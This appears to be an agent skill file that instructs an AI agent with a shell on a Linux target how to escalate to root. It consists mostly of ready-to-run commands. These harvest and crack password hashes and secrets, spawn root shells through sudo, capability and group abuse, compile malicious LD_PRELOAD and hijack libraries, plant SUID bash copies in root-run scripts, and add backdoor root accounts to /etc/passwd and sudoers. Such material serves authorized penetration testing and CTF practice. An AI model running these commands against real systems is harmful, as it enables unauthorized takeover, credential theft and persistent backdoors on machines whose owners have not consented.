---
name: linux-privilege-escalation
description: any task where you have a shell on a Linux target and need to escalate privileges.
metadata: 
  requirements:
  - hashcat
  - john
---
# Linux Privilege Escalation

## Process Overview

Privilege escalation is an enumeration problem first. The goal of the initial phase is to answer
four questions about the current user:

```
1. What am I explicitly allowed to do?        →  sudo rights, group memberships
2. What can I read that I shouldn't?          →  sensitive files, credentials, hashes
3. What can I write that I shouldn't?         →  scripts, binaries, config files run by root
4. What runs as root that I can influence?    →  cron, timers, services, SUID binaries
```

Collect answers to all four before acting. The exploitation technique follows from the finding,
not the other way around.

**Execution note:** all multi-step shell logic in this skill is written as one-liners. On a
remote or constrained shell, multi-line constructs are unreliable, prefer semicolons and
single `&&`/`||` chains. Avoid commands that require a TTY (`su`, interactive editors)
unless you have confirmed TTY availability.

---

## 1. Enumeration

### 1.1 Who am I and what am I explicitly allowed to do?

```bash
# id covers uid, gid, and all supplementary groups in one call — no need for whoami/groups
id

# Sudo rights — highest-yield single command in privesc
sudo -l 2>/dev/null

# All users with interactive login shells
grep -vE '(nologin|false|sync)' /etc/passwd | cut -d: -f1,3,4,6,7
```

**What to record from `sudo -l`:**
- Any entry with `NOPASSWD` — executable sudo without a password
- `env_keep+=LD_PRELOAD` or `env_keep+=LD_LIBRARY_PATH` — shared library injection path
- A script or binary path that may be writable (follow up in 1.3)
- `(ALL) ALL` — already root, stop here

**What to record from `id`:**
Note any non-standard supplementary groups. These carry implicit privileges:

| Group | Implied access |
|---|---|
| `sudo`, `wheel`, `admin` | sudo execution |
| `docker` | root-equivalent via container mount |
| `lxd`, `lxc` | root-equivalent via container mount |
| `disk` | raw block device read/write including `/` |
| `shadow` | read `/etc/shadow` directly |
| `adm` | read system logs in `/var/log` |

---

### 1.2 What can I read that I shouldn't?

**Authentication files — check these first, in order:**
```bash
# Shadow file: readable = hashes available immediately
cat /etc/shadow 2>/dev/null

# Passwd: always readable; non-standard UIDs or hashes in field 2 are signals
cat /etc/passwd

# Old password history kept by PAM cracklib
cat /etc/security/opasswd 2>/dev/null
```

**Shell history — frequent source of cleartext credentials passed as CLI arguments:**
```bash
cat ~/.bash_history ~/.zsh_history 2>/dev/null; find /home /root -name '.*_history' -readable 2>/dev/null | xargs cat 2>/dev/null
```

**Environment of the current process:**
```bash
env | grep -iE 'pass|secret|key|token|api'
```

**Config files in common application paths:**
```bash
grep -rsiE '(password|passwd|secret)\s*[=:]' /etc/ /var/www/ /opt/ /home/ 2>/dev/null | grep -v Binary
```

**SSH private keys:**
```bash
find /home /root /etc/ssh -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null
```

**Recently modified files — surfaces fresh scripts or credentials:**
```bash
find /etc /var /opt /home -type f -newer /tmp -ls 2>/dev/null
```

---

### 1.3 What can I write that I shouldn't?

**Critical authentication and privilege files:**
```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab 2>/dev/null; ls -la /etc/sudoers.d/ 2>/dev/null
```

**Files in `/etc` not owned by current user but writable:**
```bash
find /etc -writable -type f ! -user $(whoami) 2>/dev/null
```

**Writable systemd unit files:**
```bash
find /etc/systemd /lib/systemd /usr/lib/systemd -name '*.service' -o -name '*.timer' 2>/dev/null | xargs ls -la 2>/dev/null | grep $(whoami)
```

**Writable entries in `$PATH` — enables binary hijack if root's PATH overlaps:**
```bash
echo "$PATH" | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE PATH ENTRY: $d"; done
```

**Writable shared library directories — input to library hijacking:**
```bash
ldconfig -p | awk '{print $4}' | xargs -I{} dirname {} 2>/dev/null | sort -u | while read d; do [ -w "$d" ] && echo "WRITABLE LIB DIR: $d"; done
```

---

### 1.4 What runs as root that I can influence?

**Cron jobs — read all sources:**
```bash
(cat /etc/crontab; cat /etc/cron.d/* 2>/dev/null; crontab -l 2>/dev/null) | grep -v '^#' | grep -v '^$'
```

**Systemd timers — cron's modern replacement, often missed:**
```bash
systemctl list-timers --all 2>/dev/null
```
For any timer, inspect the unit it activates: `systemctl cat <service>.service` — look at
`ExecStart=` and check whether that path is writable.

**Processes running as root:**
```bash
ps -eo pid,user,comm,args --sort=user 2>/dev/null | awk '$2=="root" && !/\[/' | grep -v grep
```
Note paths to scripts or binaries and cross-check writability with `ls -la <path>`.

**SUID binaries — scoped to directories that actually contain executables:**
```bash
find /usr/bin /usr/sbin /bin /sbin /usr/local/bin /usr/local/sbin -perm -4000 -user root -type f 2>/dev/null
```
Anything outside standard OS paths or any custom binary is the primary signal.

**Capabilities:**
```bash
getcap -r /usr/bin /usr/sbin /bin /sbin /usr/local/bin 2>/dev/null
```


### 1.5 Password Cracking

Run this locally whenever Enumeration yields hashes from `/etc/shadow`, config files, or history.

Start by identifying the hash type, the `$id$` prefix in `/etc/shadow` field 2 determines the algorithm:

| Prefix | Algorithm | hashcat mode |
|---|---|---|
| `$1$` | MD5crypt | 500 |
| `$5$` | SHA-256crypt | 7400 |
| `$6$` | SHA-512crypt | 1800 |
| `$y$` | yescrypt | 500 (approx, use john) |
| `$2y$`, `$2b$` | bcrypt | 3200 |


Next, choose a tool:

**Use `hashcat` when a GPU is available**, it is orders of magnitude faster for MD5crypt and
SHA-512crypt. On CPU-only machines it offers no advantage over `john` and may be slower.

**Use `john` when GPU is unavailable**, the hash type is uncommon (yescrypt, bcrypt), or
the cracking runs on the target machine itself where `john` is more likely to be installed.

Wordlist strategy run in this order, stop when a password is found

**Round 1: rockyou with no rules (fastest, catches most lab/CTF passwords):**
```bash
# hashcat
hashcat -m <mode> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --status --status-timer=30

# john
john --format=<format> --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Round 2: rockyou with rules (catches variations: Password1, p@ssw0rd, etc.):**
```bash
# hashcat — best64 is fast; dive is thorough but slow
hashcat -m <mode> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --status --status-timer=30

# john
john --format=<format> --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.txt
```

**Round 3: larger wordlists (if rockyou failed and time permits):**
```bash
# Common locations for additional wordlists on Kali
ls /usr/share/seclists/Passwords/ 2>/dev/null
ls /usr/share/wordlists/ 2>/dev/null
```

**Round 4: mask attack for predictable patterns (e.g. Season+Year+Symbol):**
```bash
# hashcat mask: uppercase letter, 5 lowercase, 2 digits, 1 symbol
hashcat -m <mode> -a 3 hashes.txt '?u?l?l?l?l?l?d?d?s' --status --status-timer=30
```

**Read cracked passwords:**
```bash
hashcat -m <mode> hashes.txt --show    # hashcat potfile
john --show hashes.txt                  # john potfile
```

Once a password is found, test it for reuse: `sudo -l` (if not already tried with it), `su <other_user>`, SSH to other hosts.

---

## 2. Escalation

### Sudo misconfiguration

**`NOPASSWD: /usr/bin/<binary>` — spawn a shell through the allowed binary:**
```bash
# find
sudo find . -exec /bin/bash \; -quit

# python3 / python
sudo python3 -c 'import os; os.system("/bin/bash")'

# vim / vi
sudo vim -c ':!/bin/bash'

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# env
sudo env /bin/bash

# tar
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# less / more — type !/bin/bash at the prompt (requires TTY)
sudo less /etc/passwd
```

**`env_keep+=LD_PRELOAD` with any NOPASSWD command:**
```bash
printf '#include <stdlib.h>\nvoid _init(){unsetenv("LD_PRELOAD");setuid(0);setgid(0);system("/bin/bash");}' > /tmp/pe.c && gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c && sudo LD_PRELOAD=/tmp/pe.so <allowed_binary>
```

---

### Writable script executed by root (cron / timer / service)

```bash
# Overwrite the script and wait for the scheduler to run it
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <script_path> && chmod +x <script_path>
# After execution:
/tmp/bash -p
```

**If the script is not writable but the parent directory is:**
```bash
# Confirm
ls -la $(dirname <script_path>)
# Replace the file
cp /dev/null <script_path> && echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <script_path> && chmod +x <script_path>
```

**Cron PATH hijack — no absolute path in cron command, writable earlier PATH entry:**
```bash
# e.g. crontab has: PATH=/home/user:/usr/bin  and runs: backup (no leading /)
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup && chmod +x /home/user/backup
```

**Systemd timer with relative ExecStart:**
```bash
# Confirm it is relative (no leading /):
systemctl cat <service>.service | grep ExecStart
# Find which systemd PATH entry is writable and plant a binary there
systemctl show-environment | grep '^PATH'
```

---

### Writable critical files

**`/etc/passwd` is writable — append a root-equivalent user:**
```bash
python3 -c "import crypt,sys; print('hacked:' + crypt.crypt('hacked','\$6\$salt\$') + ':0:0:root:/root:/bin/bash')" >> /etc/passwd && su hacked
```

**`/etc/sudoers` or `/etc/sudoers.d/` is writable:**
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers && sudo /bin/bash
```

---

### SUID binary exploitation

**Inspect what the binary loads at runtime:**
```bash
# Missing libraries are the primary signal
ldd <binary> 2>/dev/null | grep 'not found'

# What paths does the binary open at runtime
strace <binary> 2>&1 | grep -E '^open|^openat' | grep -v ENOENT | grep '\.so'
```

**Library hijack — binary loads a missing `.so` from a writable path:**
```bash
# Compile malicious library and place it where the binary searches
printf '#include <stdlib.h>\nvoid _init(){setuid(0);setgid(0);system("/bin/bash -p");}' > /tmp/evil.c && gcc -fPIC -shared -nostartfiles -o <writable_search_path>/<libname>.so /tmp/evil.c && <suid_binary>
```

---

### Capabilities

**`cap_setuid+ep` on an interpreter:**
```bash
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash")'
perl -e 'use POSIX; setuid(0); exec "/bin/bash"'
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

**`cap_dac_read_search+ep` — read any file regardless of permissions:**
```bash
tar xf /etc/shadow --to-command='cat'
```

**`cap_dac_override+ep` — write any file:**
```bash
python3 -c "open('/etc/passwd','a').write('hacked::0:0:root:/root:/bin/bash\n')" && su hacked
```

---

### Privileged group membership

**`docker` group:**
```bash
docker run -v /:/host --rm -it alpine chroot /host /bin/bash
```

**`lxd` group:**
```bash
lxc init ubuntu:20.04 priv -c security.privileged=true 2>/dev/null && lxc config device add priv hostfs disk source=/ path=/mnt/root recursive=true && lxc start priv && lxc exec priv -- chroot /mnt/root /bin/bash
```

**`disk` group:**
```bash
df / | awk 'NR==2{print $1}' | xargs debugfs -w
# Inside debugfs: cat /etc/shadow, write files, etc.
```

**`shadow` group:**
```bash
cat /etc/shadow   # readable; proceed to Phase 2 cracking
```

---

### Kernel version — last resort

```bash
uname -r; cat /etc/os-release; which gcc cc g++ 2>/dev/null
```

Search the exact kernel version string for known local privilege escalation exploits.
Prefer exploits with explicit stability notes — kernel exploits risk crashing the system
and are the noisiest option. Exhaust all other paths first.

---

## Common Failure Modes

| Symptom | Action |
|---|---|
| `sudo -l` requires a password | Check 1.2 for reused credentials; retry with any password found |
| SUID scan returns only standard binaries | Run `getcap`; check 1.3 for writable lib dirs |
| `strace` unavailable | Use `ltrace`; infer search path from `readelf -d <binary> \| grep RPATH` |
| Cron scripts not writable | Check parent directory writability; check PATH hijack |
| Hash cracking stalls on Round 1 | Move to Round 2 (rules) before switching wordlists — rules have higher yield than wordlist size |
| `lxc init` fails on image download | Use `lxc image list images:` to find available images or import one manually |